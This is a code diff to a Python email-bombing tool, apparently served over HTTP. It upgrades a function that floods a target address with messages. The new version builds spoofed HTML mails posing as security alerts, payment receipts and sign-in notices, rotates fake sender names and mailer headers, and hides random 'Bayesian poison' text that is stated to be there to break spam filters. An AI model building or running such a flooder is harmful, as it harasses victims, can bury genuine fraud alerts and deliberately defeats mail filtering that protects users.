@@ -1,33 +1,92 @@
 from http.server import BaseHTTPRequestHandler
 import json
 import smtplib
+from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
+from email.utils import formatdate, make_msgid
 import os
 import random
 import string
 import time
 
-# ── RANDOMIZED EMAIL BODY GENERATOR ──
-def gen_body():
-    templates = [
-        "Verification code: {c}. Do not share this with anyone.",
-        "Your OTP is {c}. Valid for 5 minutes.",
-        "Security alert: Unusual login detected. Code: {c}",
-        "Account notification #{c} — action required.",
-        "Confirm identity: {c}. Auto-generated message.",
-        "Transaction ${a} pending. Ref: {c}",
-        "{c} is your temporary access code.",
-        "Delivery update — tracking: {c}",
-        "Reminder: Appointment confirmed. Ref #{c}",
-        "Payment of ${a} processed. Verify: {c}",
-        "New sign-in from unknown device. Code: {c}",
-        "Your account was accessed. Verify: {c}",
-        "Password reset requested. Use code {c}",
-        "Suspicious activity on your account. Code: {c}",
+# ── DYNAMIC HTML PAYLOAD GENERATOR ──
+def gen_payload(target_email, sender_email):
+    msg = MIMEMultipart('alternative')
+    
+    sender_names = ["Support", "Security Team", "Alerts", "Admin", "Billing", "Customer Care", "No Reply", "System"]
+    subjects = [
+        f"Action Required: Alert #{random.randint(1000,9999)}",
+        "Your recent sign-in",
+        f"Receipt for Order {random.choice(string.ascii_uppercase)}{random.randint(10000,99999)}",
+        "Security Notice",
+        "Verify your device",
+        "Unusual activity detected",
+        "Your subscription update",
+        "Payment Processed",
+        "Delivery Exception Notice",
+        "Account Locked - Action Required"
     ]
-    c = ''.join(random.choices(string.digits, k=6))
-    a = f"{random.randint(10,999)}.{random.randint(10,99)}"
-    return random.choice(templates).format(c=c, a=a)
+    
+    display_name = random.choice(sender_names)
+    msg['From'] = f"{display_name} <{sender_email}>"
+    msg['To'] = target_email
+    msg['Subject'] = random.choice(subjects)
+    msg['Date'] = formatdate(localtime=True)
+    msg['Message-ID'] = make_msgid(domain="reaper-ops.local")
+    
+    msg['X-Priority'] = str(random.randint(1, 5))
+    msg['X-Mailer'] = random.choice(["Microsoft Outlook 16.0", "Apple Mail (2.3654.120.0.1.13)", "Thunderbird 78.14.0", "YahooMailProxy/3.2"])
+    
+    # Bayesian poison (invisible text to break spam filters)
+    poison = ''.join(random.choices(string.ascii_letters + " ", k=random.randint(150, 400)))
+    code = ''.join(random.choices(string.digits, k=6))
+    amount = f"{random.randint(10, 999)}.{random.randint(10, 99)}"
+    
+    html_templates = [
+        f"""
+        <html><body style="font-family: Arial, sans-serif; color: #333; padding: 20px;">
+        <div style="max-width: 600px; margin: 0 auto; border: 1px solid #eee; padding: 20px; border-radius: 5px;">
+        <h2 style="color: #d9534f;">Security Alert</h2>
+        <p>We detected an unusual sign-in attempt on your account.</p>
+        <p>If this was you, please use the following verification code to authorize the device:</p>
+        <h1 style="background: #f5f5f5; padding: 15px; text-align: center; letter-spacing: 5px;">{code}</h1>
+        <p style="font-size: 12px; color: #888;">If you did not request this, please secure your account immediately.</p>
+        <div style="display:none; opacity:0;">{poison}</div>
+        </div></body></html>
+        """,
+        f"""
+        <html><body style="font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; background-color: #f9f9f9; padding: 30px;">
+        <div style="background: white; padding: 30px; border-radius: 8px; max-width: 500px; margin: 0 auto; box-shadow: 0 2px 4px rgba(0,0,0,0.1);">
+        <h2 style="margin-top: 0;">Payment Receipt</h2>
+        <p>Thank you for your recent purchase. Your payment has been processed successfully.</p>
+        <table style="width: 100%; border-top: 1px solid #ddd; border-bottom: 1px solid #ddd; margin: 20px 0; padding: 10px 0;">
+        <tr><td><strong>Total Billed:</strong></td><td style="text-align: right;"><strong>${amount}</strong></td></tr>
+        <tr><td>Transaction ID:</td><td style="text-align: right;">TXN-{random.randint(1000000,9999999)}</td></tr>
+        </table>
+        <p style="font-size: 12px; color: #777;">If you don't recognize this charge, use PIN {code} to dispute it.</p>
+        <div style="display:none; color:white; font-size:1px;">{poison}</div>
+        </div></body></html>
+        """,
+        f"""
+        <html><body style="font-family: sans-serif; background: #eceff1; margin: 0; padding: 20px;">
+        <div style="background: white; max-width: 400px; margin: 0 auto; padding: 20px; border-radius: 10px; text-align: center;">
+        <div style="width: 50px; height: 50px; background: #007bff; color: white; border-radius: 50%; line-height: 50px; font-size: 24px; margin: 0 auto 15px;">&#128276;</div>
+        <h3 style="margin: 0 0 10px;">New Notification</h3>
+        <p style="color: #555;">You have <strong>{random.randint(2, 9)}</strong> unread messages waiting in your secure inbox.</p>
+        <a href="#" style="display: inline-block; background: #007bff; color: white; text-decoration: none; padding: 10px 20px; border-radius: 5px; margin-top: 15px;">View Messages</a>
+        <p style="font-size: 10px; color: #aaa; margin-top: 20px;">Ref: {code}</p>
+        <div style="display:none; height:0px; overflow:hidden;">{poison}</div>
+        </div></body></html>
+        """
+    ]
+    
+    text = f"Notification. Code: {code}. Amount: ${amount}. Ref: {poison[:20]}"
+    part1 = MIMEText(text, 'plain')
+    part2 = MIMEText(random.choice(html_templates), 'html')
+    
+    msg.attach(part1)
+    msg.attach(part2)
+    return msg
 
 # ── STANDARD EMAIL FLOODER ──
 def email_flood(target_email, count=25):
@@ -52,10 +111,7 @@ def email_flood(target_email, count=25):
 
         for i in range(count):
             try:
-                msg = MIMEText(gen_body())
-                msg['From'] = sender
-                msg['To'] = target_email
-                msg['Subject'] = f"Alert {random.randint(1000, 9999)}"
+                msg = gen_payload(target_email, sender)
                 server.sendmail(sender, [target_email], msg.as_string())
                 results.append({'seq': total_sent + 1, 'status': 'sent'})
                 total_sent += 1
